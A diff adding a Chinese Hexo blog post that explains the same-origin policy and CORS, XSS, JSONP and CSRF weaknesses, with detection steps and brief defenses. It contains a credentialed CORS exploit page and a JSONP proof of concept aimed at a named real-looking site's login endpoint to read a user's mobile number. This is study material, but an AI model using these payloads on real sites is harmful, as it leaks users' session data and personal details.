@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="同源策略,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="同源策略(SOP)源：同’源’中的’源’：协议+域名+端口只有两个页面具有相同的 协议+域名+端口，那么他们称之为同源。(子域名也不是同源的。例如：test.com和sub.test.com)">
+<meta name="keywords" content="同源策略">
+<meta property="og:type" content="article">
+<meta property="og:title" content="同源策略以及出现的各类安全问题">
+<meta property="og:url" content="http://yoursite.com/2019/05/23/同源策略以及出现的各类安全问题/index.html">
+<meta property="og:site_name" content="故人梦">
+<meta property="og:description" content="同源策略(SOP)源：同’源’中的’源’：协议+域名+端口只有两个页面具有相同的 协议+域名+端口，那么他们称之为同源。(子域名也不是同源的。例如：test.com和sub.test.com)">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://211.159.177.185/Im9/20190321210409.png">
+<meta property="og:image" content="http://211.159.177.185/Im9/20190321210954.png">
+<meta property="og:image" content="http://211.159.177.185/Im9/20190321215826.png">
+<meta property="og:updated_time" content="2019-05-23T02:11:47.805Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="同源策略以及出现的各类安全问题">
+<meta name="twitter:description" content="同源策略(SOP)源：同’源’中的’源’：协议+域名+端口只有两个页面具有相同的 协议+域名+端口，那么他们称之为同源。(子域名也不是同源的。例如：test.com和sub.test.com)">
+<meta name="twitter:image" content="http://211.159.177.185/Im9/20190321210409.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/23/同源策略以及出现的各类安全问题/">
+
+
+
+
+
+  <title>同源策略以及出现的各类安全问题 | 故人梦</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">故人梦</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">至今朝，忆往昔、</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resources">
+          <a href="/resources/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-modx"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/23/同源策略以及出现的各类安全问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="故人梦">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="故人梦">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">同源策略以及出现的各类安全问题</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-23T00:00:00+08:00">
+                2019-05-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/前端安全/" itemprop="url" rel="index">
+                    <span itemprop="name">前端安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,057 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h3><h4 id="源："><a href="#源：" class="headerlink" title="源："></a>源：</h4><p>同’源’中的’源’：协议+域名+端口<br>只有两个页面具有相同的 协议+域名+端口，那么他们称之为同源。(子域名也不是同源的。例如：test.com和sub.test.com)<br><a id="more"></a></p>
+<h4 id="同源策略："><a href="#同源策略：" class="headerlink" title="同源策略："></a>同源策略：</h4><p>同源策略是浏览器的一个安全模型，它规定了：不同源的两个客户端脚本在没有授权的情况下，不能读写对方的资源。(同时这里需要注意的一个概念：同源策略是浏览器的一种安全措施，它并没有禁止脚本的执行，只是由于同源策略的作用禁止读取HTTP回复，实际上，脚本是成功运行了的)</p>
+<h4 id="没有同源策略会产生的危害："><a href="#没有同源策略会产生的危害：" class="headerlink" title="没有同源策略会产生的危害："></a>没有同源策略会产生的危害：</h4><p>如果没有同源策略的作用，任意站点之间可以可以操作资源，当你在访问一个合法网站的时候，又打开了一个恶意网站，包含了恶意脚本，恶意脚本便可以操作合法网站上的一切资源。</p>
+<h4 id="可跨域的文件和标签"><a href="#可跨域的文件和标签" class="headerlink" title="可跨域的文件和标签"></a>可跨域的文件和标签</h4><p>通常一些静态文件不受同源策略的影响：js/css/jpg/png<br>一些跨域标签：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;...&quot;&gt;</span><br><span class="line">&lt;video src=&quot;...&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;audio src=&quot;...&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;embed src=&quot;...&quot;&gt;</span><br><span class="line">&lt;frame src=&quot;...&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</span><br><span class="line">&lt;applet code=&quot;...&quot;&gt;&lt;/applet&gt;</span><br><span class="line">&lt;object data=&quot;...&quot; &gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="出现的问题："><a href="#出现的问题：" class="headerlink" title="出现的问题："></a>出现的问题：</h4><p>禁止了跨域，一定程度上来说就限制了前端功能的实现，就会出现各种跨域。其中包含XSS, CSRF, JSONP, CORS。  </p>
+<p><strong>关于XSS和JSONP</strong>：因为 XSS 和 JSONP都是用上述的标签来实现的，所以浏览器的同源策略对其影响并不大。</p>
+<p><strong>关于CSRF</strong>：因为同源策略是浏览器的安全策略，并没有禁止脚本的运行，只是禁止了读取HTTP请求的回复。所以实际上请求是发送成功的，而 CSRF 就是当请求发送成功，服务器端执行成功，那么 CSRF 就相当于攻击成功了，并不需要服务器的回复。<br>而同源策略对于 CSRF 的防御作用就是：防止 CSRF 请求读取异源的授权的token。</p>
+<p><strong>关于CORS</strong>：CORS又称为跨域资源共享。是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。</p>
+<p>下面着重记录一下CORS漏洞</p>
+<h4 id="CORS漏洞："><a href="#CORS漏洞：" class="headerlink" title="CORS漏洞："></a>CORS漏洞：</h4><h5 id="跨域访问的场景："><a href="#跨域访问的场景：" class="headerlink" title="跨域访问的场景："></a>跨域访问的场景：</h5><p>1、前后端分离，前端和后端在不同的域名上，后端通过提供接口给前端使用。此时就会发生跨域的请求。<br>2、在本地做开发，本地的文件夹并不是在同一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。<br>3、电商网站想通过用户浏览器加载第三方快递网站的物流信息。<br>4、子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</p>
+<h5 id="如何进行跨域资源共享："><a href="#如何进行跨域资源共享：" class="headerlink" title="如何进行跨域资源共享："></a>如何进行跨域资源共享：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//准备环境</span><br><span class="line">windows物理机：192.168.1.159/a.html  //去跨域访问kali里面的b.php文件内容</span><br><span class="line">kali：192.168.1.248/b.php       //配置Access-Control-Allow-Origin，允许跨域</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//192.168.1.159/a.html</span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange = function() &#123;</span><br><span class="line">        if(xhr.readyState === 4) &#123;</span><br><span class="line">            console.log(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.open(&quot;GET&quot;, &quot;http://192.168.1.248/b.php&quot;);</span><br><span class="line">    xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//192.168.1.248/b.php</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: http://192.168.1.159&quot;);</span><br><span class="line">//header(&quot;Access-Control-Allow-Credentials:true&quot;);</span><br><span class="line">echo &apos;secret&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">//只允许192.168.1.159这个主机进行跨域资源共享</span><br></pre></td></tr></table></figure>
+<p>访问<a href="http://192.168.1.159/a.html，跨域访问资源成功。" target="_blank" rel="noopener">http://192.168.1.159/a.html，跨域访问资源成功。</a><br><img src="http://211.159.177.185/Im9/20190321210409.png" alt><br>如果我们 Access-Control-Allow-Origin 不设置为 <a href="http://192.168.1.159，设置为其他的：" target="_blank" rel="noopener">http://192.168.1.159，设置为其他的：</a><br><img src="http://211.159.177.185/Im9/20190321210954.png" alt><br>明显就是同源策略禁止了资源共享。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials:true   //该参数表示允许带上cookie访问资源。</span><br><span class="line">header(&quot;Access-Control-Allow-Credentials:true&quot;);</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);   //表示允许所有主机跨域请求资源，一般出现问题也是由于开发者的大意导致配置出错。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Credentials: true&quot;);</span><br></pre></td></tr></table></figure>
+<p>如果这两条配置遇到了，允许所有主机带上cookie跨域请求资源，那么浏览器会自动判别为这是极度危险的，会拒接呈现服务端返回的资源。容易造成用户个人数据被窃取。</p>
+<h5 id="为什么会出现CORS漏洞-跨域资源共享漏洞-："><a href="#为什么会出现CORS漏洞-跨域资源共享漏洞-：" class="headerlink" title="为什么会出现CORS漏洞(跨域资源共享漏洞)："></a>为什么会出现CORS漏洞(跨域资源共享漏洞)：</h5><p>1、前面说到，因为在很多情况下需要在两个域名之间进行接口调用、资源共享，就存在CORS。<br>2、跨域资源共享，需要配置允许跨域的主机：Access-Control-Allow-Origin。如果配置不当，造成攻击者就可以绕过跨域限制，形成CORS漏洞。</p>
+<h5 id="如何发现CORS漏洞："><a href="#如何发现CORS漏洞：" class="headerlink" title="如何发现CORS漏洞："></a>如何发现CORS漏洞：</h5><p>1、自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:foo.example.org的Enable框。<br>2、将浏览器中的burp开上(这样访问的网站链接才会在HTTP history中)，访问足够多的网页。<br>3、在HTTP history模块下筛选带有CORS头部的值，筛选的条件可以是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: foo.example.org</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://211.159.177.185/Im9/20190321215826.png" alt><br>*特别的：扫描目录的时候可能会遇到 <code>crossdomain.xml</code> 这个目录，里面可能是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">  &lt;allow-access-from domain=&quot;*&quot; /&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure></p>
+<p>意思是支持所有域。</p>
+<h5 id="如何绕过CORS："><a href="#如何绕过CORS：" class="headerlink" title="如何绕过CORS："></a>如何绕过CORS：</h5><p>1、有些通过通配符匹配就很容易出现问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Access-Control-Allow-Origin: *.example.com&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>这种通过 xxx.example.com 就可以绕过。<br>2、…具体情况具体分析(遇到了再补充)</p>
+<h5 id="攻击的Poc："><a href="#攻击的Poc：" class="headerlink" title="攻击的Poc："></a>攻击的Poc：</h5><p>收集了一份Poc：<br>攻击代码需要放在绕过了限制的主机上面，比如前面的：xxx.example.com<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h2&gt;CORS POC Exploit&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;Extract SID&lt;/h3&gt;</span><br><span class="line"> </span><br><span class="line">&lt;div id=&quot;demo&quot;&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">function cors() &#123;</span><br><span class="line">  var xhttp = new XMLHttpRequest();</span><br><span class="line">  xhttp.onreadystatechange = function() &#123;</span><br><span class="line">    if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">      document.getElementById(&quot;demo&quot;).innerHTML = alert(this.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(&quot;GET&quot;, &quot;https://target.com/info/&quot;, true);</span><br><span class="line">  xhttp.withCredentials = true;</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<h5 id="CORS漏洞防御方法："><a href="#CORS漏洞防御方法：" class="headerlink" title="CORS漏洞防御方法："></a>CORS漏洞防御方法：</h5><p>仔细配置允许跨域的主机范围 Access-Control-Allow-Origin</p>
+<h4 id="前面说到了CORS的利用场景和Poc，后面就记录一下XSS，JSONP，CSRF的利用场景、相应的Poc和防御方法。"><a href="#前面说到了CORS的利用场景和Poc，后面就记录一下XSS，JSONP，CSRF的利用场景、相应的Poc和防御方法。" class="headerlink" title="前面说到了CORS的利用场景和Poc，后面就记录一下XSS，JSONP，CSRF的利用场景、相应的Poc和防御方法。"></a>前面说到了CORS的利用场景和Poc，后面就记录一下XSS，JSONP，CSRF的利用场景、相应的Poc和防御方法。</h4><h5 id="XSS："><a href="#XSS：" class="headerlink" title="XSS："></a>XSS：</h5><p><del><strong><em>可能出现的场景</em></strong></del>：<br>1、一切可以插入的框框(搜索框，留言框，个人资料处)<br>2、上传处的自定义文件名<br>3、在线客服<br>4、404报错页面显示错误页面路径<br>5、填写订单资料处<br>6、…(一切可以插入且与用户交互的地方)  </p>
+<p><del><strong><em>防御方法</em></strong></del>：<br>1、替换过滤<br>2、编码，HTML实体化<br>3、…  </p>
+<h5 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP:"></a>JSONP:</h5><p><del><strong><em>可能出现的场景：(前提都是有敏感信息，才有利用的价值)</em></strong></del><br>1、有类似于callback的参数传递函数名<br>2、没有类似于callback这类参数，但是可以通过fuzz找到可能隐藏的这类参数，从而利用  </p>
+<p><del><strong><em>攻击的Poc：(根据实际情况更改)</em></strong></del><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function gurenmeng(json)&#123;</span><br><span class="line">    alert(json.mobile)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://bgwd.360haoyao.com/checkLogin?callback=gurenmeng&amp;_=1543627881752&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p><del><strong><em>防御方法：</em></strong></del><br>1、验证referer<br>2、验证token或者cookie<br><del><strong><em>绕过方法：</em></strong></del><br>如果referer过滤不严格，能绕过的情况下，可以使用vps绑定这个类似的域名，然后绕过  </p>
+<h5 id="CSRF："><a href="#CSRF：" class="headerlink" title="CSRF："></a>CSRF：</h5><p><del><strong><em>可能出现的场景：</em></strong></del><br>1、个人信息修改处<br>2、收货地址处<br>3、…<br><del><strong><em>攻击的Poc：</em></strong></del><br>相应的Poc可以通过burp生成<br><del><strong><em>防御方法：</em></strong></del><br>1、验证referer<br>2、验证cookie或token<br>3、增加验证码<br><del><strong><em>绕过方法：</em></strong></del><br>如果referer过滤不严格，能绕过的情况下，可以使用vps绑定这个类似的域名，然后绕过  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/同源策略/" rel="tag"># 同源策略</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/22/用户登录处的逻辑漏洞挖掘/" rel="next" title="用户登录处的逻辑漏洞挖掘">
+                <i class="fa fa-chevron-left"></i> 用户登录处的逻辑漏洞挖掘
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">故人梦</p>
+              <p class="site-description motion-element" itemprop="description">人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#同源策略-SOP"><span class="nav-number">1.</span> <span class="nav-text">同源策略(SOP)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#源："><span class="nav-number">1.1.</span> <span class="nav-text">源：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#同源策略："><span class="nav-number">1.2.</span> <span class="nav-text">同源策略：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#没有同源策略会产生的危害："><span class="nav-number">1.3.</span> <span class="nav-text">没有同源策略会产生的危害：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可跨域的文件和标签"><span class="nav-number">1.4.</span> <span class="nav-text">可跨域的文件和标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#出现的问题："><span class="nav-number">1.5.</span> <span class="nav-text">出现的问题：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CORS漏洞："><span class="nav-number">1.6.</span> <span class="nav-text">CORS漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#跨域访问的场景："><span class="nav-number">1.6.1.</span> <span class="nav-text">跨域访问的场景：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如何进行跨域资源共享："><span class="nav-number">1.6.2.</span> <span class="nav-text">如何进行跨域资源共享：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#为什么会出现CORS漏洞-跨域资源共享漏洞-："><span class="nav-number">1.6.3.</span> <span class="nav-text">为什么会出现CORS漏洞(跨域资源共享漏洞)：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如何发现CORS漏洞："><span class="nav-number">1.6.4.</span> <span class="nav-text">如何发现CORS漏洞：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如何绕过CORS："><span class="nav-number">1.6.5.</span> <span class="nav-text">如何绕过CORS：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#攻击的Poc："><span class="nav-number">1.6.6.</span> <span class="nav-text">攻击的Poc：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CORS漏洞防御方法："><span class="nav-number">1.6.7.</span> <span class="nav-text">CORS漏洞防御方法：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#前面说到了CORS的利用场景和Poc，后面就记录一下XSS，JSONP，CSRF的利用场景、相应的Poc和防御方法。"><span class="nav-number">1.7.</span> <span class="nav-text">前面说到了CORS的利用场景和Poc，后面就记录一下XSS，JSONP，CSRF的利用场景、相应的Poc和防御方法。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" 